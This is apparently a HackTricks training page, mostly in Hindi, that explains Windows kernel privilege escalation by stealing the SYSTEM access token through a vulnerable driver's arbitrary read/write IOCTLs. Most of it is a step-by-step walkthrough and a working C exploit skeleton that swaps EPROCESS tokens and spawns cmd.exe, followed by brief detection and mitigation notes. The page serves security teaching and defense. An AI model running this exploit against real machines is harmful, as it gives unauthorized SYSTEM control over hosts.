# Windows kernel EoP: Token stealing with arbitrary kernel R/W

{{#include ../../banners/hacktricks-training.md}}

## अवलोकन

यदि कोई vulnerable driver ऐसा IOCTL expose करता है जो attacker को arbitrary kernel read और/या write primitives देता है, तो NT AUTHORITY\SYSTEM तक privilege उठाना अक्सर SYSTEM access token चोरी करके हासिल किया जा सकता है। यह technique SYSTEM प्रक्रिया के EPROCESS से Token pointer को वर्तमान प्रक्रिया के EPROCESS में copy करती है।

क्यों यह काम करता है:
- हर प्रक्रिया के पास एक EPROCESS structure होता है जो (अन्य फ़ील्ड्स के अलावा) एक Token रखता है (वास्तव में token object के लिए एक EX_FAST_REF)।
- SYSTEM process (PID 4) के पास सभी privileges enabled वाले token होते हैं।
- वर्तमान प्रक्रिया के EPROCESS.Token को SYSTEM token pointer से बदल देने पर वर्तमान प्रक्रिया तुरंत SYSTEM के रूप में चलने लगती है।

> Offsets in EPROCESS vary across Windows versions. Determine them dynamically (symbols) or use version-specific constants. Also remember that EPROCESS.Token is an EX_FAST_REF (low 3 bits are reference count flags).

## उच्च-स्तरीय चरण

1) ntoskrnl.exe base को ढूंढें और PsInitialSystemProcess का address resolve करें.
- user mode से, loaded driver bases प्राप्त करने के लिए NtQuerySystemInformation(SystemModuleInformation) या EnumDeviceDrivers का उपयोग करें.
- PsInitialSystemProcess का offset (from symbols/reversing) kernel base में जोड़ें ताकि उसका address मिल सके.
2) PsInitialSystemProcess पर स्थित pointer पढ़ें → यह SYSTEM के EPROCESS का kernel pointer होता है.
3) SYSTEM EPROCESS से, UniqueProcessId और ActiveProcessLinks offsets पढ़ें ताकि EPROCESS structures की doubly linked list (ActiveProcessLinks.Flink/Blink) traverse कर सकें जब तक कि आप वह EPROCESS न मिल जाए जिसका UniqueProcessId GetCurrentProcessId() के बराबर हो। दोनों को रखें:
- EPROCESS_SYSTEM (for SYSTEM)
- EPROCESS_SELF (for the current process)
4) SYSTEM token value पढ़ें: Token_SYS = *(EPROCESS_SYSTEM + TokenOffset).
- निचले 3 बिट्स mask कर दें: Token_SYS_masked = Token_SYS & ~0xF (commonly ~0xF or ~0x7 depending on build; on x64 the low 3 bits are used — 0xFFFFFFFFFFFFFFF8 mask).
5) Option A (common): अपने current token के निचले 3 बिट्स को सुरक्षित रखें और embedded ref count consistent रखने के लिए उन्हें SYSTEM के pointer पर splice करें।
- Token_ME = *(EPROCESS_SELF + TokenOffset)
- Token_NEW = (Token_SYS_masked | (Token_ME & 0x7))
6) अपने kernel write primitive का उपयोग करके Token_NEW को (EPROCESS_SELF + TokenOffset) में वापस लिखें।
7) अब आपकी वर्तमान प्रक्रिया SYSTEM बन चुकी है। पुष्टि के लिए वैकल्पिक रूप से नया cmd.exe या powershell.exe spawn करें।

## Pseudocode

नीचे एक skeleton है जो केवल vulnerable driver के दो IOCTLs का उपयोग करता है, एक 8-byte kernel read के लिए और एक 8-byte kernel write के लिए। इसे अपने driver’s interface से बदलें।
```c
#include <Windows.h>
#include <Psapi.h>
#include <stdint.h>

// Device + IOCTLs are driver-specific
#define DEV_PATH   "\\\\.\\VulnDrv"
#define IOCTL_KREAD  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_KWRITE CTL_CODE(FILE_DEVICE_UNKNOWN, 0x802, METHOD_BUFFERED, FILE_ANY_ACCESS)

// Version-specific (examples only – resolve per build!)
static const uint32_t Off_EPROCESS_UniquePid    = 0x448; // varies
static const uint32_t Off_EPROCESS_Token        = 0x4b8; // varies
static const uint32_t Off_EPROCESS_ActiveLinks  = 0x448 + 0x8; // often UniquePid+8, varies

BOOL kread_qword(HANDLE h, uint64_t kaddr, uint64_t *out) {
struct { uint64_t addr; } in; struct { uint64_t val; } outb; DWORD ret;
in.addr = kaddr; return DeviceIoControl(h, IOCTL_KREAD, &in, sizeof(in), &outb, sizeof(outb), &ret, NULL) && (*out = outb.val, TRUE);
}
BOOL kwrite_qword(HANDLE h, uint64_t kaddr, uint64_t val) {
struct { uint64_t addr, val; } in; DWORD ret;
in.addr = kaddr; in.val = val; return DeviceIoControl(h, IOCTL_KWRITE, &in, sizeof(in), NULL, 0, &ret, NULL);
}

// Get ntoskrnl base (one option)
uint64_t get_nt_base(void) {
LPVOID drivers[1024]; DWORD cbNeeded;
if (EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded) && cbNeeded >= sizeof(LPVOID)) {
return (uint64_t)drivers[0]; // first is typically ntoskrnl
}
return 0;
}

int main(void) {
HANDLE h = CreateFileA(DEV_PATH, GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
if (h == INVALID_HANDLE_VALUE) return 1;

// 1) Resolve PsInitialSystemProcess
uint64_t nt = get_nt_base();
uint64_t PsInitialSystemProcess = nt + /*offset of symbol*/ 0xDEADBEEF; // resolve per build

// 2) Read SYSTEM EPROCESS
uint64_t EPROC_SYS; kread_qword(h, PsInitialSystemProcess, &EPROC_SYS);

// 3) Walk ActiveProcessLinks to find current EPROCESS
DWORD myPid = GetCurrentProcessId();
uint64_t cur = EPROC_SYS; // list is circular
uint64_t EPROC_ME = 0;
do {
uint64_t pid; kread_qword(h, cur + Off_EPROCESS_UniquePid, &pid);
if ((DWORD)pid == myPid) { EPROC_ME = cur; break; }
uint64_t flink; kread_qword(h, cur + Off_EPROCESS_ActiveLinks, &flink);
cur = flink - Off_EPROCESS_ActiveLinks; // CONTAINING_RECORD
} while (cur != EPROC_SYS);

// 4) Read tokens
uint64_t tok_sys, tok_me;
kread_qword(h, EPROC_SYS + Off_EPROCESS_Token, &tok_sys);
kread_qword(h, EPROC_ME  + Off_EPROCESS_Token, &tok_me);

// 5) Mask EX_FAST_REF low bits and splice refcount bits
uint64_t tok_sys_mask = tok_sys & ~0xF; // or ~0x7 on some builds
uint64_t tok_new = tok_sys_mask | (tok_me & 0x7);

// 6) Write back
kwrite_qword(h, EPROC_ME + Off_EPROCESS_Token, tok_new);

// 7) We are SYSTEM now
system("cmd.exe");
return 0;
}
```
Notes:
- Offsets: सही offsets पाने के लिए target के PDBs के साथ WinDbg’s `dt nt!_EPROCESS` या किसी runtime symbol loader का उपयोग करें। अंधाधुंध hardcode न करें।
- Mask: x64 पर token एक EX_FAST_REF होता है; low 3 bits reference count बिट्स होते हैं। अपने token के मूल low bits बनाए रखने से तुरंत refcount असंगतियों से बचा जा सकता है।
- Stability: वर्तमान process को elevate करना प्राथमिकता दें; अगर आप किसी short-lived helper को elevate करते हैं तो वह exit होने पर SYSTEM खो सकता है।

## डिटेक्शन और निवारण
- unsigned या untrusted third‑party drivers को लोड करना जो powerful IOCTLs expose करते हैं, मूल कारण होता है।
- Kernel Driver Blocklist (HVCI/CI), DeviceGuard, और Attack Surface Reduction नियम vulnerable drivers के लोड होने को रोक सकते हैं।
- EDR suspicious IOCTL sequences के लिए निगरानी कर सकता है जो arbitrary read/write लागू करते हैं और token swaps के लिए भी देख सकता है।

## References
- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) and kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
- [FuzzySecurity – Windows Kernel ExploitDev (token stealing examples)](https://www.fuzzysecurity.com/tutorials/expDev/17.html)

{{#include ../../banners/hacktricks-training.md}}
